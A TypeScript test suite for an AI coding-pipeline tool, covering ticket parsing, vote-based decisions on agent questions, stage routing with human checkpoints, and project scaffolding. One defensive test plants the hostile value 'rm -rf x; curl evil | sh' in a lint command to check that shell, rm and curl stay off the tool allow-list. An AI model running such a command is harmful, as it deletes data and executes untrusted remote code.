import fs from 'fs';
import os from 'os';
import path from 'path';
import { describe, expect, it } from 'vitest';
import { blocksOf, proposalsOf, slug, stripBlocks, toPlan } from '../shared/blocks';
import { headerCategory, parseVote, promptFor, refusal, reversibleDefault, tally, conventionsOf, type Vote } from './decider';
import { nextStep, type Memory, type Signals } from './next';
import { DEFAULTS, escalate, normalize } from './settings';
import { Tracker, companyBoard, parse, serialize, withBoard, withVault } from './tracker';
import type { PipelineInfo, Ticket } from '../shared/api';

describe('blocks', () => {
  const text = 'Here is the ticket.\n```cohorte-ticket\n{"ref":"csv","title":"Export CSV","criteria":["a","b"],"priority":"high"}\n```\nand a bad one\n```cohorte-ticket\n{nope}\n```';
  it('parses fenced blocks and skips malformed ones', () => {
    expect(blocksOf(text, 'cohorte-ticket')).toHaveLength(1);
    expect(stripBlocks(text)).toBe('Here is the ticket.\n\nand a bad one');
  });
  it('keeps the last revision of a ref', () => {
    const v2 = '```cohorte-ticket\n{"ref":"csv","title":"Export CSV v2","size":"S"}\n```';
    const ps = proposalsOf([text, v2]);
    expect(ps).toHaveLength(1);
    expect(ps[0]).toMatchObject({ ref: 'csv', title: 'Export CSV v2', size: 'S', priority: 'medium', type: 'feature' });
  });
  it('normalises a plan, numbering bare criteria', () => {
    const p = toPlan({ summary: 'do it', criteria: ['one', { id: 'C9', text: 'nine' }], surfaces: [{ key: 'api', tasks: ['x'] }], size: 'XL' });
    expect(p?.criteria).toEqual([{ id: 'C1', text: 'one' }, { id: 'C9', text: 'nine' }]);
    expect(p?.size).toBe('?');
    expect(toPlan({ criteria: [] })).toBeNull();
  });
  it('slugs titles into ids', () => { expect(slug('Exporter les rendez-vous en CSV !')).toBe('exporter-les-rendez-vous-en-csv'); expect(slug('***')).toBe('ticket'); });
});

describe('decider', () => {
  const opts = ['zod (Recommended)', 'yup'];
  const v = (choice: string | null, category: Vote['category'] = 'reversible', kind: Vote['source']['kind'] = 'spec'): Vote => ({ choice, category, source: { kind, ref: '§5', quote: 'q' }, rationale: 'r' });
  it('parses a vote leniently and maps the choice to an exact option', () => {
    const x = parseVote('sure: {"choice":"YUP","category":"visible","source":{"kind":"decision","ref":"d1"}}', opts);
    expect(x.choice).toBe('yup'); expect(x.category).toBe('visible'); expect(x.source.kind).toBe('decision');
    expect(parseVote('no json', opts).choice).toBeNull();
    expect(parseVote('{"choice":"zod (Recommended)","category":"weird"}', opts).category).toBe('behavior'); // unknown ⇒ cautious
  });
  it('tallies agreement and keeps the most severe category', () => {
    const t = tally([v('yup'), v('yup', 'visible'), v('zod (Recommended)')]);
    expect(t.choice).toBe('yup'); expect(t.agreement).toBeCloseTo(2 / 3); expect(t.category).toBe('visible');
  });
  it('refuses what is not settled, per autonomy', () => {
    const unanimous = tally([v('yup'), v('yup'), v('yup')]);
    expect(refusal(unanimous, 'balanced')).toBeNull();
    expect(refusal(tally([v('yup', 'contract'), v('yup'), v('yup')]), 'autonomous')).toMatch(/contract/);
    expect(refusal(tally([v('yup', 'reversible', 'none'), v('yup', 'reversible', 'none')]), 'autonomous')).toMatch(/no source/);
    expect(refusal(tally([v('yup'), v('yup'), v('zod (Recommended)')]), 'balanced')).toMatch(/split/);
    expect(refusal(tally([v('yup'), v('yup'), v('zod (Recommended)')]), 'autonomous')).toBeNull();
    expect(refusal(tally([v('yup', 'visible'), v('yup', 'visible')]), 'prudent')).toMatch(/prudent/);
    expect(refusal(tally([v('yup', 'visible', 'code'), v('yup', 'visible', 'code')]), 'balanced')).toMatch(/precedent/);
  });
  it('takes the agent\'s recommendation on a reversible choice nothing settles — except when prudent', () => {
    const q = { question: 'name?', header: '', multiSelect: false, options: [{ label: 'toCsvRow (Recommended)', description: '' }, { label: 'formatRow', description: '' }] };
    const t = tally([v(null, 'reversible', 'none'), v(null, 'reversible', 'none'), v(null, 'reversible', 'none')]);
    expect(reversibleDefault(t, q, 'balanced')).toMatchObject({ decided: true, choice: 'toCsvRow (Recommended)', tally: { source: { kind: 'recommendation' } } });
    expect(reversibleDefault(t, q, 'prudent')).toBeNull();
    expect(reversibleDefault(tally([v(null, 'reversible', 'none'), v(null, 'visible', 'none')]), q, 'autonomous')).toBeNull();
  });
  it('reads a declared category from the header', () => { expect(headerCategory(' Security ')).toBe('security'); expect(headerCategory('DB')).toBeNull(); });
  it('builds a prompt with the settled context', () => {
    const p = promptFor({ question: 'Which validator?', header: 'visible', multiSelect: false, options: [{ label: 'zod', description: '' }] },
      { plan: null, spec: 'SPEC BODY', decisions: '- 2026 · api · zod everywhere', conventions: '', preferences: [{ at: '', feature: 'f', question: 'lib?', header: '', answer: 'zod', kind: 'answer' }], stage: 'build', feature: 'f1' });
    expect(p).toContain('SPEC BODY'); expect(p).toContain('zod everywhere'); expect(p).toContain('Q: lib? → zod (the developer answered)');
  });
  it('extracts §Conventions', () => { expect(conventionsOf('# x\n## Conventions\n- **SH-001** — a\n## Design\n- b')).toBe('- **SH-001** — a'); });
});

describe('autopilot routing', () => {
  const pipe = (command: string | null, build: PipelineInfo['stages'][number]['state'] = 'todo'): PipelineInfo => ({
    stages: [{ key: 'spec', label: 'Spec', state: 'done' }, { key: 'build', label: 'Build', state: build }], next: command ? { command, args: 'f', why: '' } : null, verdict: null, loop: null,
  });
  const sig = (o: Partial<Signals> = {}): Signals => ({ pipeline: pipe('cohorte-build'), readiness: null, verdict: null, verify: null, buildDead: false, ...o });
  const mem = (o: Partial<Memory> = {}): Memory => ({ rounds: 0, lastBlocking: null, reservationsAck: false, failures: {}, stages: [], ...o });
  const done = (stage: string, status: 'done' | 'failed' | 'stopped' = 'done', model = 'sonnet') => ({ stage, runId: stage, model, status, costUsd: 0, startedAt: '', endedAt: '' });
  const s = DEFAULTS;
  it('builds a frozen spec', () => { expect(nextStep('f', sig(), mem(), s)).toMatchObject({ kind: 'run', stage: 'build', model: 'sonnet', args: 'f' }); });
  it('stops on a NOT-READY spec', () => { expect(nextStep('f', sig({ readiness: 'NOT-READY' }), mem(), s)).toMatchObject({ kind: 'checkpoint', cp: 'cp2' }); });
  it('checks the direction once after a build on a spec with reservations', () => {
    const m = mem({ stages: [done('build')] });
    expect(nextStep('f', sig({ pipeline: pipe('cohorte-review', 'done'), readiness: 'RESERVATIONS' }), m, s)).toMatchObject({ kind: 'checkpoint', cp: 'cp2' });
    expect(nextStep('f', sig({ pipeline: pipe('cohorte-review', 'done'), readiness: 'RESERVATIONS' }), { ...m, reservationsAck: true }, s)).toMatchObject({ kind: 'run', stage: 'review' });
  });
  it('always reviews after a fix, even with a stale REVISE on disk', () => {
    expect(nextStep('f', sig({ pipeline: pipe('cohorte-fix'), verdict: { verdict: 'REVISE', blocking: 2, high: 0, medium: 0, aborted: null } }), mem({ rounds: 1, stages: [done('build'), done('review'), done('fix')] }), s))
      .toMatchObject({ kind: 'run', stage: 'review' });
  });
  it('fixes a REVISE, escalates a round that made no progress, and gives up when stuck or out of rounds', () => {
    const v = (blocking: number) => ({ verdict: 'REVISE', blocking, high: 0, medium: 0, aborted: null });
    const after = [done('build'), done('review')];
    expect(nextStep('f', sig({ pipeline: pipe('cohorte-fix'), verdict: v(3) }), mem({ stages: after }), s)).toMatchObject({ kind: 'run', stage: 'fix', model: 'sonnet' });
    expect(nextStep('f', sig({ pipeline: pipe('cohorte-fix'), verdict: v(3) }), mem({ rounds: 1, lastBlocking: 3, stages: after }), s)).toMatchObject({ kind: 'run', stage: 'fix', model: 'opus' });
    expect(nextStep('f', sig({ pipeline: pipe('cohorte-fix'), verdict: v(3) }), mem({ rounds: 2, lastBlocking: 3, stages: after }), s)).toMatchObject({ kind: 'checkpoint', cp: 'cp2' });
    expect(nextStep('f', sig({ pipeline: pipe('cohorte-fix'), verdict: v(1) }), mem({ rounds: 3, lastBlocking: 2, stages: after }), s)).toMatchObject({ kind: 'checkpoint', cp: 'cp2' });
  });
  it('never auto-fixes a security BLOCK', () => {
    expect(nextStep('f', sig({ pipeline: pipe('cohorte-fix'), verdict: { verdict: 'BLOCK', blocking: 1, high: 0, medium: 0, aborted: null } }), mem({ stages: [done('review')] }), s)).toMatchObject({ kind: 'checkpoint', cp: 'cp2' });
  });
  it('turns a red preflight into a fix round, other aborts into CP2', () => {
    const ab = (aborted: string) => ({ verdict: 'BLOCK', blocking: null, high: 0, medium: 0, aborted });
    expect(nextStep('f', sig({ pipeline: pipe('cohorte-review'), verdict: ab('preflight') }), mem({ stages: [done('review')] }), s)).toMatchObject({ kind: 'run', stage: 'fix' });
    expect(nextStep('f', sig({ pipeline: pipe('cohorte-review'), verdict: ab('empty-diff') }), mem({ stages: [done('review')] }), s)).toMatchObject({ kind: 'checkpoint', cp: 'cp2' });
  });
  it('fixes a SHIP that still carries HIGH/MEDIUM findings', () => {
    expect(nextStep('f', sig({ pipeline: pipe('cohorte-verify'), verdict: { verdict: 'SHIP', blocking: 0, high: 1, medium: 0, aborted: null } }), mem({ stages: [done('review')] }), s)).toMatchObject({ kind: 'run', stage: 'fix' });
  });
  it('verifies, fixes a fresh runtime failure, re-verifies a stale one, and opens CP3 when clean', () => {
    const clean = { verdict: 'SHIP', blocking: 0, high: 0, medium: 0, aborted: null };
    expect(nextStep('f', sig({ pipeline: pipe('cohorte-verify'), verdict: clean }), mem({ stages: [done('review')] }), s)).toMatchObject({ kind: 'run', stage: 'verify', model: 'haiku' });
    expect(nextStep('f', sig({ pipeline: pipe('cohorte-verify'), verdict: clean, verify: 'FAIL' }), mem({ stages: [done('verify')] }), s)).toMatchObject({ kind: 'run', stage: 'fix' });
    expect(nextStep('f', sig({ pipeline: pipe('cohorte-verify'), verdict: clean, verify: 'FAIL' }), mem({ stages: [done('fix'), done('review')] }), s)).toMatchObject({ kind: 'run', stage: 'verify' });
    expect(nextStep('f', sig({ pipeline: pipe('cohorte-ship'), verdict: clean, verify: 'PASS' }), mem({ stages: [done('verify')] }), s)).toMatchObject({ kind: 'checkpoint', cp: 'cp3' });
  });
  it('retries a failed stage one model up, then opens CP2', () => {
    expect(nextStep('f', sig(), mem({ stages: [done('build', 'failed', 'sonnet')], failures: { build: 1 } }), s)).toMatchObject({ kind: 'run', stage: 'build', model: 'opus' });
    expect(nextStep('f', sig(), mem({ stages: [done('build', 'failed')], failures: { build: 2 } }), s)).toMatchObject({ kind: 'checkpoint', cp: 'cp2' });
    expect(nextStep('f', sig(), mem({ stages: [done('build', 'stopped')], failures: { build: 1 } }), s)).toMatchObject({ kind: 'checkpoint', cp: 'cp2' });
  });
});

describe('settings', () => {
  it('normalises and escalates', () => {
    const n = normalize({ autonomy: 'wild', models: { build: 'claude-sonnet-5-5', review: 'bad model!' }, maxRounds: 99 });
    expect(n.autonomy).toBe('balanced'); expect(n.models.build).toBe('claude-sonnet-5-5'); expect(n.models.review).toBe('sonnet'); expect(n.maxRounds).toBe(3);
    expect(escalate('haiku')).toBe('sonnet'); expect(escalate('fable')).toBe('fable'); expect(escalate('claude-x')).toBe('claude-x');
  });
});

describe('tracker', () => {
  const t: Ticket = {
    id: 'csv-export', title: 'Export "CSV"', type: 'feature', status: 'acceptance', requester: 'Marie', priority: 'high', size: 'M', created: '2026-11-20', updated: '2026-11-20T10:00:00.000Z',
    parent: null, pr: '#12', conversation: 'ab12cd34', need: 'They export by hand.', value: '2h/week', criteria: ['Given a list, when I export, then I get a CSV'], outOfScope: ['PDF'],
    notes: '', acceptance: { at: '2026-11-21', summary: 'You can export.', changes: ['An Export button'], howToTest: ['Click Export: a file downloads'], outOfScope: ['PDF'] }, feedback: ['2026-11-22 · accepted'],
  };
  it('round-trips a ticket note', () => { expect(parse(serialize(t), 'x')).toEqual(t); });
  it('refuses a note that is not a ticket', () => { expect(parse('---\ntags: [other]\n---\n', 'x')).toBeNull(); expect(parse('no front matter', 'x')).toBeNull(); });
  it('stores tickets with unique ids', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'tickets-'));
    const tr = new Tracker({ kind: 'local', dir, board: null, reason: '', projectName: null });
    const a = tr.create({ title: 'Same title' }); const b = tr.create({ title: 'Same title' });
    expect([a.id, b.id]).toEqual(['same-title', 'same-title-2']);
    expect(tr.update(a.id, { status: 'framing' })?.status).toBe('framing');
    expect(tr.list().map((x) => x.id).sort()).toEqual(['same-title', 'same-title-2']);
    fs.rmSync(dir, { recursive: true, force: true });
  });
  it('edits the user config in place', () => {
    const tpl = 'enabled: true\nobsidian:\n  vault_path: ""              # cfg:vault_path\nkanban:\n  enabled: false   # cfg:kanban_enabled\n  columns:\n    ideas: "Ideas"\n  boards: {}\n  #   SAMO:\n';
    const out = withBoard(withVault(tpl, '/v'), 'app', 'App/Tasks.md');
    expect(out).toContain('  vault_path: "/v"  # cfg:vault_path');
    expect(out).toContain('  enabled: true  # cfg:kanban_enabled');
    expect(out).toContain('  boards:\n    app:\n      board: "App/Tasks.md"');
    const again = withBoard(out, 'app', 'Other/Tasks.md');
    expect(again.match(/app:/g)).toHaveLength(1); expect(again).toContain('board: "Other/Tasks.md"');
    expect(withBoard('enabled: true\n', 'x', 'X.md')).toContain('kanban:\n  enabled: true\n  boards:\n    x:\n      board: "X.md"');
  });
  it('creates a company board', () => { const b = companyBoard(); expect(b).toContain('## To validate · business'); expect(b).toContain('"list-collapse":[false,false,false,false,false,false,false,false,false,false]'); });
});

// ---------------------------------------------------------------------------------------------------------------
// founding a project

import { toFoundation, toScaffold, toVision } from '../shared/blocks';
import { parseRemote, scaffoldTools, visionMarkdown, withVcs } from './founding';

describe('founding blocks', () => {
  it('a vision needs a pitch and a first version', () => {
    expect(toVision({ pitch: 'x' })).toBeNull();
    const v = toVision({ name: 'D', pitch: 'Booking for dentists', first_version: ['book'], users: ['receptionist', 3] });
    expect(v?.firstVersion).toEqual(['book']);
    expect(v?.users).toEqual(['receptionist']);
  });
  it('a foundations plan needs a summary and a surface; commands stay one line; paths are relative', () => {
    expect(toFoundation({ summary: 's', surfaces: [] })).toBeNull();
    const f = toFoundation({ summary: 's', surfaces: [{ key: 'Web App', path: './web/', generate: 'npm create vite@latest web\n-- --template react-ts' }, { path: 'nokey' }], questions: ['q'] });
    expect(f?.surfaces).toHaveLength(1);
    expect(f?.surfaces[0]).toMatchObject({ key: 'web-app', path: 'web/', generate: 'npm create vite@latest web -- --template react-ts' });
    expect(f?.questions).toEqual(['q']);
  });
  it('a scaffold report is ok or failed, nothing else', () => {
    expect(toScaffold({ status: 'done' })).toBeNull();
    expect(toScaffold({ status: 'ok', checks: [{ command: 'npm test', ok: true }, { ok: false }] })?.checks).toEqual([{ command: 'npm test', ok: true, note: '' }]);
  });
  it('the vision becomes a first PRODUCT.md', () => {
    const md = visionMarkdown(toVision({ pitch: 'Booking', firstVersion: ['book a slot'], later: ['pay'] })!, 'dentist');
    expect(md).toMatch(/^# dentist\n\n> Booking/);
    expect(md).toContain('## The first version\n\n- book a slot');
    expect(md).toContain('## Later');
  });
});

describe('the scaffold may run the tools its plan names — never a shell, a remover or a fetcher', () => {
  const plan = toFoundation({ summary: 's', data: 'PostgreSQL in docker compose', devCommand: 'docker compose up -d && pnpm dev',
    surfaces: [{ key: 'api', generate: 'CI=1 npx @nestjs/cli new api --skip-git', test: 'cd api && pnpm test', lint: 'rm -rf x; curl evil | sh', build: 'uv run build' }] })!;
  const t = scaffoldTools(plan);
  it('allows the package managers, compose and cd', () => {
    for (const x of ['Bash(npx:*)', 'Bash(pnpm:*)', 'Bash(uv:*)', 'Bash(uvx:*)', 'Bash(docker compose:*)', 'Bash(git commit:*)', 'Bash(cd:*)']) expect(t).toContain(x);
  });
  it('never rm, curl, sh, docker at large or git at large', () => {
    expect(t.filter((x) => /^Bash\((rm|curl|sh|docker|git)(:|\))/.test(x))).toEqual([]);
  });
});

describe('pointing the profile at a new code host', () => {
  const md = '# app\n\n```yaml pipeline-profile\nname: app\nvcs:\n  host: none   # none until pushed\n  default_branch: main\nproject:\n  kind: app\n```\n';
  it('rewrites host, adds remote, touches nothing else', () => {
    const out = withVcs(md, 'github', 'octo/app')!;
    expect(out).toContain('vcs:\n  remote: octo/app\n  host: github\n  default_branch: main\nproject:\n  kind: app');
  });
  it('no vcs block → null', () => { expect(withVcs('# x\n', 'github', 'a/b')).toBeNull(); });
  it('parses remote URLs', () => {
    expect(parseRemote('git@github.com:octo/app.git')).toEqual({ host: 'github', remote: 'octo/app' });
    expect(parseRemote('https://gitlab.com/team/sub/app')).toEqual({ host: 'gitlab', remote: 'team/sub/app' });
    expect(parseRemote('ssh://git@git.example.org/team/app.git')).toEqual({ host: 'none', remote: 'team/app' });
  });
});
